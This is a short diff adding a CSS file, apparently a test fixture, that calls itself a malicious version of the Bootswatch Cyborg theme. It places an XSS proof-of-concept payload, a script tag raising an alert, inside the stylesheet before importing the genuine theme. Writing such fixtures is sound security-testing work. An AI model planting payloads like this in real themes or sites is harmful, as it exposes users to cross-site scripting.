@@ -1,0 +1,10 @@
+/* Malicious CSS file based on Cyborg theme */
+body {
+  background-color: black;
+}
+
+/* Inject the XSS payload */
+<script>alert('1');</script>
+
+/* Include the actual Cyborg theme */
+@import url('https://bootswatch.com/4/cyborg/bootstrap.min.css');
